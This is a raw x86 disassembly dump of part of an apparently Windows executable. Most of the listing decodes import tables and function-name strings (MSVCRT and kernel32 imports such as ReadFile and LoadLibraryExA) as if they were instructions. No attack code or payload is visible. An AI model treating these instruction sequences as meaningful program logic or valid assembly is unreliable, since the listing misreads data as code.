  41d60c:	mov    bl,ah
  41d60e:	add    DWORD PTR [eax],eax
  41d610:	pushf  
  41d611:	fadd   QWORD PTR [ecx]
  41d613:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d619:	fadd   QWORD PTR [ecx]
  41d61b:	add    ah,cl
  41d61d:	fadd   QWORD PTR [ecx]
  41d61f:	add    al,ah
  41d621:	fadd   QWORD PTR [ecx]
  41d623:	add    ah,dh
  41d625:	fadd   QWORD PTR [ecx]
  41d627:	add    BYTE PTR [esi],al
  41d629:	fld    QWORD PTR [ecx]
  41d62b:	add    BYTE PTR [esi],dl
  41d62d:	fld    QWORD PTR [ecx]
  41d62f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d636:	add    DWORD PTR [eax],eax
  41d638:	dec    edx
  41d639:	fld    QWORD PTR [ecx]
  41d63b:	add    BYTE PTR [eax-0x23],bl
  41d63e:	add    DWORD PTR [eax],eax
  41d640:	pusha  
  41d641:	fld    QWORD PTR [ecx]
  41d643:	add    BYTE PTR [esi-0x23],ch
  41d646:	add    DWORD PTR [eax],eax
  41d648:	test   ch,bl
  41d64a:	add    DWORD PTR [eax],eax
  41d64c:	mov    ds,ebp
  41d64e:	add    DWORD PTR [eax],eax
  41d650:	sahf   
  41d651:	fld    QWORD PTR [ecx]
  41d653:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d65a:	add    DWORD PTR [eax],eax
  41d65c:	fcmovu st,st(5)
  41d65e:	add    DWORD PTR [eax],eax
  41d660:	out    dx,al
  41d661:	fld    QWORD PTR [ecx]
  41d663:	add    ah,bh
  41d665:	fld    QWORD PTR [ecx]
  41d667:	add    BYTE PTR [eax],cl
  41d669:	fiadd  WORD PTR [ecx]
  41d66b:	add    BYTE PTR [eax],ah
  41d66d:	fiadd  WORD PTR [ecx]
  41d66f:	add    BYTE PTR [edx],dh
  41d671:	fiadd  WORD PTR [ecx]
  41d673:	add    BYTE PTR [edx-0x22],cl
  41d676:	add    DWORD PTR [eax],eax
  41d678:	pop    esp
  41d679:	fiadd  WORD PTR [ecx]
  41d67b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d67f:	add    BYTE PTR [edx-0x71fffe22],al
  41d685:	fiadd  WORD PTR [ecx]
  41d687:	add    BYTE PTR [edx+0x1de],ah
  41d68d:	add    BYTE PTR [eax],al
  41d68f:	add    al,al
  41d691:	fiadd  WORD PTR [ecx]
  41d693:	add    dl,cl
  41d695:	fiadd  WORD PTR [ecx]
  41d697:	add    ah,dl
  41d699:	fiadd  WORD PTR [ecx]
  41d69b:	add    al,ah
  41d69d:	fiadd  WORD PTR [ecx]
  41d69f:	add    ah,dh
  41d6a1:	fiadd  WORD PTR [ecx]
  41d6a3:	add    BYTE PTR [eax],al
  41d6a5:	fild   WORD PTR [ecx]
  41d6a7:	add    BYTE PTR [edx],bl
  41d6a9:	fild   WORD PTR [ecx]
  41d6ab:	add    BYTE PTR [edx],ch
  41d6ad:	fild   WORD PTR [ecx]
  41d6af:	add    BYTE PTR [eax],bh
  41d6b1:	fild   WORD PTR [ecx]
  41d6b3:	add    BYTE PTR [eax-0x21],dl
  41d6b6:	add    DWORD PTR [eax],eax
  41d6b8:	fild   WORD PTR fs:[ecx]
  41d6bb:	add    BYTE PTR [esi-0x21],bh
  41d6be:	add    DWORD PTR [eax],eax
  41d6c0:	mov    edi,ds
  41d6c2:	add    DWORD PTR [eax],eax
  41d6c4:	cwde   
  41d6c5:	fild   WORD PTR [ecx]
  41d6c7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d6cd:	fild   WORD PTR [ecx]
  41d6cf:	add    dh,al
  41d6d1:	fild   WORD PTR [ecx]
  41d6d3:	add    dh,dl
  41d6d5:	fild   WORD PTR [ecx]
  41d6d7:	add    dh,ah
  41d6d9:	fild   WORD PTR [ecx]
  41d6db:	add    ah,bh
  41d6dd:	fild   WORD PTR [ecx]
  41d6df:	add    BYTE PTR [eax],cl
  41d6e1:	loopne 0x41d6e4
  41d6e3:	add    BYTE PTR [eax+eiz*8],dl
  41d6e6:	add    DWORD PTR [eax],eax
  41d6e8:	sub    al,ah
  41d6ea:	add    DWORD PTR [eax],eax
  41d6ec:	ds loopne 0x41d6f0
  41d6ef:	add    BYTE PTR [esi-0x20],dl
  41d6f2:	add    DWORD PTR [eax],eax
  41d6f4:	data16 loopne 0x41d6f8
  41d6f7:	add    BYTE PTR [edx-0x20],dh
  41d6fa:	add    DWORD PTR [eax],eax
  41d6fc:	xchg   al,ah
  41d6fe:	add    DWORD PTR [eax],eax
  41d700:	xchg   esp,eax
  41d701:	loopne 0x41d704
  41d703:	add    BYTE PTR [esi-0x47fffe20],ch
  41d709:	loopne 0x41d70c
  41d70b:	add    dl,cl
  41d70d:	loopne 0x41d710
  41d70f:	add    ah,bl
  41d711:	loopne 0x41d714
  41d713:	add    dh,ch
  41d715:	loopne 0x41d718
  41d717:	add    dh,bh
  41d719:	loopne 0x41d71c
  41d71b:	add    BYTE PTR [eax],cl
  41d71d:	loope  0x41d720
  41d71f:	add    BYTE PTR [esi],bl
  41d721:	loope  0x41d724
  41d723:	add    BYTE PTR [edx],dh
  41d725:	loope  0x41d728
  41d727:	add    BYTE PTR [esi-0x1f],al
  41d72a:	add    DWORD PTR [eax],eax
  41d72c:	push   esi
  41d72d:	loope  0x41d730
  41d72f:	add    BYTE PTR [esi-0x1f],ah
  41d732:	add    DWORD PTR [eax],eax
  41d734:	jb     0x41d717
  41d736:	add    DWORD PTR [eax],eax
  41d738:	test   cl,ah
  41d73a:	add    DWORD PTR [eax],eax
  41d73c:	mov    al,ds:0xb60001e1
  41d741:	loope  0x41d744
  41d743:	add    dl,al
  41d745:	loope  0x41d748
  41d747:	add    dh,dl
  41d749:	loope  0x41d74c
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	add    BYTE PTR [eax],al
  41d74f:	add    ah,dh
  41d751:	loope  0x41d754
  41d753:	add    BYTE PTR [edx+eiz*8],al
  41d756:	add    DWORD PTR [eax],eax
  41d758:	adc    al,0xe2
  41d75a:	add    DWORD PTR [eax],eax
  41d75c:	and    ah,dl
  41d75e:	add    DWORD PTR [eax],eax
  41d760:	xor    dl,ah
  41d762:	add    DWORD PTR [eax],eax
  41d764:	ds loop 0x41d768
  41d767:	add    BYTE PTR [edx-0x1e],dl
  41d76a:	add    DWORD PTR [eax],eax
  41d76c:	pusha  
  41d76d:	loop   0x41d770
  41d76f:	add    BYTE PTR [edx-0x1e],bh
  41d772:	add    DWORD PTR [eax],eax
  41d774:	xchg   dl,ah
  41d776:	add    DWORD PTR [eax],eax
  41d778:	cwde   
  41d779:	loop   0x41d77c
  41d77b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d782:	add    DWORD PTR [eax],eax
  41d784:	int3   
  41d785:	loop   0x41d788
  41d787:	add    dh,dl
  41d789:	loop   0x41d78c
  41d78b:	add    al,ah
  41d78d:	loop   0x41d790
  41d78f:	add    dl,bh
  41d791:	loop   0x41d794
  41d793:	add    BYTE PTR [edx],cl
  41d795:	jecxz  0x41d798
  41d797:	add    BYTE PTR [edx],bl
  41d799:	jecxz  0x41d79c
  41d79b:	add    BYTE PTR [ebx+eiz*8],ah
  41d79e:	add    DWORD PTR [eax],eax
  41d7a0:	xor    al,0xe3
  41d7a2:	add    DWORD PTR [eax],eax
  41d7a4:	inc    eax
  41d7a5:	jecxz  0x41d7a8
  41d7a7:	add    BYTE PTR [esi-0x1d],cl
  41d7aa:	add    DWORD PTR [eax],eax
  41d7ac:	fs jecxz 0x41d7b0
  41d7af:	add    BYTE PTR [esi-0x1d],dh
  41d7b2:	add    DWORD PTR [eax],eax
  41d7b4:	mov    fs,ebx
  41d7b6:	add    DWORD PTR [eax],eax
  41d7b8:	mov    ds:0xb00001e3,al
  41d7bd:	jecxz  0x41d7c0
  41d7bf:	add    dl,al
  41d7c1:	jecxz  0x41d7c4
  41d7c3:	add    dh,cl
  41d7c5:	jecxz  0x41d7c8
  41d7c7:	add    dh,bl
  41d7c9:	jecxz  0x41d7cc
  41d7cb:	add    ah,ch
  41d7cd:	jecxz  0x41d7d0
  41d7cf:	add    BYTE PTR [eax],al
  41d7d1:	in     al,0x1
  41d7d3:	add    BYTE PTR [esi],cl
  41d7d5:	in     al,0x1
  41d7d7:	add    BYTE PTR [edx],ch
  41d7d9:	in     al,0x1
  41d7db:	add    BYTE PTR [esp+eiz*8],bh
  41d7de:	add    DWORD PTR [eax],eax
  41d7e0:	dec    esp
  41d7e1:	in     al,0x1
  41d7e3:	add    BYTE PTR [esi-0x1c],bl
  41d7e6:	add    DWORD PTR [eax],eax
  41d7e8:	push   0xffffffe4
  41d7ea:	add    DWORD PTR [eax],eax
  41d7ec:	jl     0x41d7d2
  41d7ee:	add    DWORD PTR [eax],eax
  41d7f0:	mov    ah,ah
  41d7f2:	add    DWORD PTR [eax],eax
  41d7f4:	cwde   
  41d7f5:	in     al,0x1
  41d7f7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d7fd:	in     al,0x1
  41d7ff:	add    al,dl
  41d801:	in     al,0x1
  41d803:	add    dl,ah
  41d805:	in     al,0x1
  41d807:	add    al,dh
  41d809:	in     al,0x1
  41d80b:	add    BYTE PTR [eax],cl
  41d80d:	in     eax,0x1
  41d80f:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d816:	add    DWORD PTR [eax],eax
  41d818:	ds in  eax,0x1
  41d81b:	add    BYTE PTR [edx-0x1b],cl
  41d81e:	add    DWORD PTR [eax],eax
  41d820:	pop    edx
  41d821:	in     eax,0x1
  41d823:	add    BYTE PTR [esi-0x1b],ch
  41d826:	add    DWORD PTR [eax],eax
  41d828:	jle    0x41d80f
  41d82a:	add    DWORD PTR [eax],eax
  41d82c:	nop
  41d82d:	in     eax,0x1
  41d82f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d836:	add    DWORD PTR [eax],eax
  41d838:	mov    eax,0xca0001e5
  41d83d:	in     eax,0x1
  41d83f:	add    dl,bl
  41d841:	in     eax,0x1
  41d843:	add    dh,ah
  41d845:	in     eax,0x1
  41d847:	add    ah,bh
  41d849:	in     eax,0x1
  41d84b:	add    BYTE PTR [esi],cl
  41d84d:	out    0x1,al
  41d84f:	add    BYTE PTR [eax],ch
  41d851:	out    0x1,al
  41d853:	add    BYTE PTR [edx],bh
  41d855:	out    0x1,al
  41d857:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d85b:	add    BYTE PTR [eax-0x1a],bl
  41d85e:	add    DWORD PTR [eax],eax
  41d860:	push   0x7a0001e6
  41d865:	out    0x1,al
  41d867:	add    BYTE PTR [esi-0x67fffe1a],al
  41d86d:	out    0x1,al
  41d86f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d875:	out    0x1,al
  41d877:	add    ah,bl
  41d879:	out    0x1,al
  41d87b:	add    dl,ch
  41d87d:	out    0x1,al
  41d87f:	add    al,bh
  41d881:	out    0x1,al
  41d883:	add    BYTE PTR [esi],cl
  41d885:	out    0x1,eax
  41d887:	add    BYTE PTR [esi],bl
  41d889:	out    0x1,eax
  41d88b:	add    BYTE PTR [edx],ch
  41d88d:	out    0x1,eax
  41d88f:	add    BYTE PTR [edx],bh
  41d891:	out    0x1,eax
  41d893:	add    BYTE PTR [edx-0x19],cl
  41d896:	add    DWORD PTR [eax],eax
  41d898:	pop    esp
  41d899:	out    0x1,eax
  41d89b:	add    BYTE PTR [eax-0x19],ch
  41d89e:	add    DWORD PTR [eax],eax
  41d8a0:	jbe    0x41d889
  41d8a2:	add    DWORD PTR [eax],eax
  41d8a4:	xchg   bh,ah
  41d8a6:	add    DWORD PTR [eax],eax
  41d8a8:	cwde   
  41d8a9:	out    0x1,eax
  41d8ab:	add    BYTE PTR [eax-0x45fffe19],ch
  41d8b1:	out    0x1,eax
  41d8b3:	add    al,dl
  41d8b5:	out    0x1,eax
  41d8b7:	add    dh,ah
  41d8b9:	out    0x1,eax
  41d8bb:	add    dh,dh
  41d8bd:	out    0x1,eax
  41d8bf:	add    BYTE PTR [edx],al
  41d8c1:	call   0xe859d8c7
  41d8c6:	add    DWORD PTR [eax],eax
  41d8c8:	and    al,0xe8
  41d8ca:	add    DWORD PTR [eax],eax
  41d8cc:	xor    al,0xe8
  41d8ce:	add    DWORD PTR [eax],eax
  41d8d0:	dec    eax
  41d8d1:	call   0xe897d8d7
  41d8d6:	add    DWORD PTR [eax],eax
  41d8d8:	callw  0xd8dd
  41d8dc:	jp     0x41d8c6
  41d8de:	add    DWORD PTR [eax],eax
  41d8e0:	xchg   al,ch
  41d8e2:	add    DWORD PTR [eax],eax
  41d8e4:	xchg   esi,eax
  41d8e5:	call   0xe8e3d8eb
  41d8ea:	add    DWORD PTR [eax],eax
  41d8ec:	mov    dl,0xe8
  41d8ee:	add    DWORD PTR [eax],eax
  41d8f0:	(bad)  
  41d8f1:	call   0xe913d8f7
  41d8f6:	add    DWORD PTR [eax],eax
  41d8f8:	in     al,0xe8
  41d8fa:	add    DWORD PTR [eax],eax
  41d8fc:	lock call 0xe93fd903
  41d902:	add    DWORD PTR [eax],eax
  41d904:	or     al,0xe9
  41d906:	add    DWORD PTR [eax],eax
  41d908:	sbb    ch,cl
  41d90a:	add    DWORD PTR [eax],eax
  41d90c:	add    BYTE PTR [eax],al
  41d90e:	add    BYTE PTR [eax],al
  41d910:	or     al,0x2
  41d912:	add    BYTE PTR [eax+0x0],al
  41d918:	cmc    
  41d919:	add    BYTE PTR [edi+0x63],bl
  41d91c:	outs   dx,DWORD PTR ds:[esi]
  41d91d:	outs   dx,BYTE PTR ds:[esi]
  41d91e:	je     0x41d992
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	ins    BYTE PTR es:[edi],dx
  41d922:	data16 jo 0x41d925
  41d925:	add    BYTE PTR [ebx],al
  41d927:	add    al,0x73
  41d929:	jns    0x41d99e
  41d92b:	je     0x41d992
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	add    BYTE PTR [eax],al
  41d930:	fwait
  41d931:	add    ebp,DWORD PTR [ecx+0x73]
  41d934:	jo     0x41d9a8
  41d936:	imul   ebp,DWORD PTR [esi+0x74],0x61035a00
  41d93d:	je     0x41d9ae
  41d93f:	ins    BYTE PTR es:[edi],dx
  41d940:	add    BYTE PTR [eax],al
  41d942:	jmp    0x7363:0x72747303
  41d949:	jo     0x41d9b9
  41d94b:	add    BYTE PTR [edi+0x73626d03],dh
  41d951:	je     0x41d9c2
  41d953:	ja     0x41d9b8
  41d955:	jae    0x41d957
  41d957:	add    bh,ah
  41d959:	add    esi,DWORD PTR [ebx+0x74]
  41d95c:	jb     0x41d9c1
  41d95e:	outs   dx,DWORD PTR ds:[esi]
  41d95f:	ins    BYTE PTR es:[edi],dx
  41d960:	ins    BYTE PTR es:[edi],dx
  41d961:	add    ch,al
  41d963:	add    esi,DWORD PTR [eax+0x72]
  41d966:	imul   ebp,DWORD PTR [esi+0x74],0xb000066
  41d96d:	add    al,0x74
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	ja     0x41d9de
  41d972:	outs   dx,DWORD PTR ds:[esi]
  41d973:	ja     0x41d9da
  41d975:	jb     0x41d977
  41d977:	add    BYTE PTR [esi],al
  41d979:	add    al,0x74
  41d97b:	imul   ebp,DWORD PTR [ebp+0x65],0x36d0000
  41d982:	data16 addr16 gs je 0x41d9ea
  41d987:	add    BYTE PTR [ebx+0x735f5f00],dh
  41d98d:	gs je  0x41d9ef
  41d990:	popa   
  41d991:	jo     0x41da03
  41d993:	pop    edi
  41d994:	je     0x41da0f
  41d996:	jo     0x41d9fd
  41d998:	add    BYTE PTR [eax],al
  41d99a:	mov    al,ds:0x705f5f00
  41d99f:	pop    edi
  41d9a0:	pop    edi
  41d9a1:	ins    WORD PTR es:[edi],dx
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	fs add BYTE PTR gs:[eax],al
  41d9a8:	xchg   esp,eax
  41d9a9:	add    ebp,DWORD PTR [ecx+0x73]
  41d9ac:	popa   
  41d9ad:	ins    BYTE PTR es:[edi],dx
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	jne    0x41da1e
  41d9b1:	add    dl,bh
  41d9b3:	add    esi,DWORD PTR [ebx+0x74]
  41d9b6:	jb     0x41da2c
  41d9b8:	outs   dx,DWORD PTR ds:[esi]
  41d9b9:	imul   eax,DWORD PTR [eax],0x0
  41d9bc:	sbb    al,0x4
  41d9be:	ja     0x41da23
  41d9c0:	jae    0x41da25
  41d9c2:	popa   
  41d9c3:	je     0x41d9c5
  41d9c5:	add    BYTE PTR [ecx+0x74626d03],bh
  41d9cb:	outs   dx,DWORD PTR ds:[esi]
  41d9cc:	ja     0x41da31
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	fwait
  41d9d1:	add    BYTE PTR [edi+0x5f],bl
  41d9d4:	jo     0x41da35
  41d9d6:	pop    edi
  41d9d7:	arpl   WORD PTR [edi+0x6d],bp
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fs add BYTE PTR gs:[eax],al
  41d9e0:	loope  0x41d9e5
  41d9e2:	jae    0x41da57
  41d9e4:	arpl   WORD PTR [ecx+0x6e],sp
  41d9e7:	data16 add BYTE PTR [eax],al
  41d9ea:	fild   DWORD PTR [eax]
  41d9ec:	pop    edi
  41d9ed:	popa   
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jae    0x41da58
  41d9f1:	pop    edi
  41d9f2:	gs js  0x41da5e
  41d9f5:	je     0x41d9f7
  41d9f7:	add    BYTE PTR [esi+0x6e695f01],al
  41d9fd:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xc8006d72
  41da05:	add    esi,DWORD PTR [eax+0x75]
  41da08:	je     0x41da6d
  41da0a:	push   0xb1007261
  41da0f:	add    ebp,DWORD PTR [edi+ebp*2+0x63]
  41da13:	popa   
  41da14:	ins    BYTE PTR es:[edi],dx
  41da15:	je     0x41da80
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	add    BYTE PTR gs:[ecx+0x3],ch
  41da1c:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  41da21:	add    BYTE PTR gs:[eax],al
  41da24:	or     eax,0x676e7504
  41da29:	gs je  0x41da8f
  41da2c:	add    BYTE PTR [eax],al
  41da2e:	sub    DWORD PTR [edi+esi*2],eax
  41da31:	arpl   WORD PTR [ebx+0x6e],si
  41da34:	arpl   WORD PTR [eax+0x79],si
  41da37:	add    bh,cl
  41da39:	add    esi,DWORD PTR [edx+0x61]
  41da3c:	outs   dx,BYTE PTR ds:[esi]
  41da3d:	add    BYTE PTR fs:[eax],al
  41da40:	sahf   
  41da41:	add    DWORD PTR [edi+0x69],ebx
  41da44:	jae    0x41dab3
  41da46:	bound  esp,QWORD PTR [edx+0x6c]
  41da49:	gs popa 
  41da4b:	add    BYTE PTR fs:[eax],al
  41da4e:	add    DWORD PTR [ebx+esi*2],eax
  41da51:	ja     0x41dac6
  41da53:	arpl   WORD PTR [ecx+0x6e],sp
  41da56:	data16 add BYTE PTR [ebx+0x77736903],ch
  41da5d:	js     0x41dac3
  41da5f:	imul   esp,DWORD PTR [edi+0x69],0x4280074
  41da66:	ja     0x41dacb
  41da68:	jae    0x41dad8
  41da6a:	arpl   WORD PTR [ebp+0x70],bp
  41da6d:	add    BYTE PTR [esi+0x75736903],bl
  41da73:	jo     0x41dae5
  41da75:	gs jb  0x41da78
  41da78:	push   edx
  41da79:	add    BYTE PTR [edi+0x58],bl
  41da7c:	arpl   WORD PTR [eax+0x74],si
  41da7f:	inc    esi
  41da80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  41da88:	pop    edi
  41da89:	gs js  0x41daf5
  41da8c:	je     0x41da8e
  41da8e:	sbb    BYTE PTR [esi+esi*2],al
  41da91:	jae    0x41db0a
  41da93:	jo     0x41db07
  41da95:	imul   ebp,DWORD PTR [esi+0x74],0xe80066
  41da9c:	pop    edi
  41da9d:	arpl   WORD PTR [ebp+0x78],sp
  41daa0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x7362035b
  41daa8:	gs popa 
  41daaa:	jb     0x41db0f
  41daac:	push   0x7303e800
  41dab1:	je     0x41db25
  41dab3:	arpl   WORD PTR [eax+0x79],si
  41dab6:	add    BYTE PTR [eax],al
  41dab8:	mov    ch,0x0
  41daba:	pop    edi
  41dabb:	pop    edi
  41dabc:	jae    0x41db23
  41dabe:	je     0x41db35
  41dac0:	jae    0x41db27
  41dac2:	jb     0x41db31
  41dac4:	popa   
  41dac5:	je     0x41db2f
  41dac7:	gs jb  0x41db3c
  41daca:	add    BYTE PTR [eax],al
  41dacc:	jb     0x41dace
  41dace:	pop    edi
  41dacf:	pop    edi
  41dad0:	addr16 gs je 0x41db41
  41dad4:	popa   
  41dad5:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  41dadc:	pop    edi
  41dadd:	add    esp,DWORD PTR [ebx+0x6c]
  41dae0:	gs popa 
  41dae2:	jb     0x41db49
  41dae4:	jb     0x41db58
  41dae6:	add    BYTE PTR [eax],al
  41dae8:	and    DWORD PTR [edi+esi*2],eax
  41daeb:	arpl   WORD PTR [ebx+0x63],si
  41daee:	jo     0x41db69
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	std    
  41daf3:	add    esi,DWORD PTR [ebx+0x74]
  41daf6:	jb     0x41db6c
  41daf8:	outs   dx,DWORD PTR ds:[esi]
  41daf9:	jne    0x41db67
  41dafb:	add    bl,al
  41dafd:	add    esi,DWORD PTR [eax+0x65]
  41db00:	jb     0x41db74
  41db02:	outs   dx,DWORD PTR ds:[esi]
  41db03:	jb     0x41db05
  41db05:	add    BYTE PTR [ebp+0x53],cl
  41db08:	push   esi
  41db09:	inc    ebx
  41db0a:	push   edx
  41db0b:	push   esp
  41db0c:	cs fs ins BYTE PTR es:[edi],dx
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	add    BYTE PTR [eax],al
  41db12:	inc    ecx
  41db13:	add    al,0x53
  41db15:	gs je  0x41db6d
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   0x6c646e61
  41db1e:	gs fs inc ebp
  41db21:	js     0x41db86
  41db23:	gs jo  0x41db9a
  41db26:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  41db2d:	gs jb  0x41db30
  41db30:	jmp    0x6946:0x74654701
  41db37:	ins    BYTE PTR es:[edi],dx
  41db38:	gs inc ecx
  41db3a:	je     0x41dbb0
  41db3c:	jb     0x41dba7
  41db3e:	bound  esi,QWORD PTR [ebp+0x74]
  41db41:	gs jae 0x41db89
  41db44:	js     0x41db87
  41db46:	add    BYTE PTR [eax],al
  41db48:	pop    esp
  41db49:	add    DWORD PTR [esi+0x69],eax
  41db4c:	outs   dx,BYTE PTR ds:[esi]
  41db4d:	fs inc esi
  41db4f:	imul   esi,DWORD PTR [edx+0x73],0x61684374
  41db56:	outs   dx,BYTE PTR ds:[esi]
  41db57:	addr16 gs dec esi
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	je     0x41dbc6
  41db5d:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41db63:	outs   dx,DWORD PTR ds:[esi]
  41db64:	outs   dx,BYTE PTR ds:[esi]
  41db65:	push   edi
  41db66:	add    BYTE PTR [eax],al
  41db68:	mov    ds:0x6c614300,al
  41db6d:	ins    BYTE PTR es:[edi],dx
  41db6e:	dec    esi
  41db6f:	popa   
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	gs fs push eax
  41db74:	imul   esi,DWORD PTR [eax+0x65],0xdb000057
  41db7b:	add    cl,BYTE PTR [ecx+0x73]
  41db7e:	push   esi
  41db7f:	popa   
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  41db89:	add    BYTE PTR [ebp+0x1],ah
  41db8c:	inc    esi
  41db8d:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  41db94:	inc    ebx
  41db95:	push   0x65676e61
  41db9a:	dec    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	je     0x41dc07
  41db9e:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41dba4:	outs   dx,DWORD PTR ds:[esi]
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	add    BYTE PTR [eax],al
  41dba8:	cmp    BYTE PTR [ebx+edx*2],al
  41dbab:	gs je  0x41dc02
  41dbae:	push   0x64616572
  41dbb3:	inc    ebp
  41dbb4:	js     0x41dc1b
  41dbb6:	arpl   WORD PTR [ebp+0x74],si
  41dbb9:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  41dbc0:	add    BYTE PTR gs:[esi],bl
  41dbc3:	add    al,BYTE PTR [edi+0x65]
  41dbc6:	je     0x41dc18
  41dbc8:	jb     0x41dc33
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	jb     0x41dc36
  41dbcd:	je     0x41dc48
  41dbcf:	inc    ebx
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	popa   
  41dbd2:	jae    0x41dc47
  41dbd4:	add    BYTE PTR [eax],al
  41dbd6:	add    DWORD PTR [bp+0x69],eax
  41dbda:	outs   dx,BYTE PTR ds:[esi]
  41dbdb:	fs dec esi
  41dbdd:	gs js  0x41dc54
  41dbe0:	inc    esi
  41dbe1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x57048d00
  41dbe9:	popa   
  41dbea:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41dbf2:	je     0x41dc5d
  41dbf4:	jo     0x41dc62
  41dbf6:	gs dec edi
  41dbf8:	bound  ebp,QWORD PTR [edx+0x65]
  41dbfb:	arpl   WORD PTR [ebx+esi*2+0x45],si
  41dbff:	js     0x41dc01
  41dc01:	add    BYTE PTR [edi],ah
  41dc03:	add    al,0x53
  41dc05:	gs je  0x41dc56
  41dc08:	popa   
  41dc09:	ins    DWORD PTR es:[edi],dx
  41dc0a:	gs fs push eax
  41dc0d:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	gs push ebx
  41dc17:	je     0x41dc7a
  41dc19:	je     0x41dc80
  41dc1b:	add    bl,bh
  41dc1d:	add    DWORD PTR [edi+0x65],eax
  41dc20:	je     0x41dc6e
  41dc22:	popa   
  41dc23:	jae    0x41dc99
  41dc25:	inc    ebp
  41dc26:	jb     0x41dc9a
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	jb     0x41dc2b
  41dc2b:	add    BYTE PTR [eax+0x6f6c4702],dl
  41dc31:	bound  esp,QWORD PTR [ecx+0x6c]
  41dc34:	inc    esi
  41dc35:	jb     0x41dc9c
  41dc37:	add    BYTE PTR gs:[eax],al
  41dc3a:	or     al,BYTE PTR [edx]
  41dc3c:	inc    edi
  41dc3d:	gs je  0x41dc8d
  41dc40:	outs   dx,DWORD PTR ds:[esi]
  41dc41:	fs jne 0x41dcb0
  41dc44:	gs dec eax
  41dc46:	popa   
  41dc47:	outs   dx,BYTE PTR ds:[esi]
  41dc48:	fs ins BYTE PTR es:[edi],dx
  41dc4a:	gs inc ecx
  41dc4c:	add    BYTE PTR [eax],al
  41dc4e:	js     0x41dc53
  41dc50:	push   edx
  41dc51:	gs popa 
  41dc53:	fs inc esi
  41dc55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47019000
  41dc5d:	gs je  0x41dca3
  41dc60:	push   eax
  41dc61:	dec    ecx
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	outs   dx,WORD PTR ds:[esi]
  41dc65:	add    BYTE PTR ds:0x74655304,ah
  41dc6b:	dec    ebp
  41dc6c:	popa   
  41dc6d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41dc75:	outs   dx,WORD PTR ds:[esi]
  41dc77:	add    dh,bh
  41dc79:	add    DWORD PTR [edi+0x65],eax
  41dc7c:	je     0x41dcca
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	arpl   WORD PTR [ecx+0x6c],sp
  41dc82:	gs dec ecx
  41dc84:	outs   dx,BYTE PTR ds:[esi]
  41dc85:	outs   dx,WORD PTR ds:[esi]
  41dc87:	inc    ecx
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	push   es
  41dc8b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41dc8f:	fs dec esp
  41dc91:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  41dc98:	js     0x41dcdb
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	add    al,BYTE PTR [edi+0x65]
  41dca0:	je     0x41dcf6
  41dca2:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41dca9:	popa   
  41dcaa:	je     0x41dced
  41dcac:	add    BYTE PTR [eax],al
  41dcae:	inc    DWORD PTR [ecx]
  41dcb0:	inc    edi
  41dcb1:	gs je  0x41dd00
  41dcb4:	outs   dx,DWORD PTR ds:[esi]
  41dcb5:	arpl   WORD PTR [ecx+0x6c],sp
  41dcb8:	gs dec ecx
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	outs   dx,WORD PTR ds:[esi]
  41dcbd:	push   edi
  41dcbe:	add    BYTE PTR [eax],al
  41dcc0:	rol    BYTE PTR [esp+ebp*2],0x73
  41dcc4:	je     0x41dd38
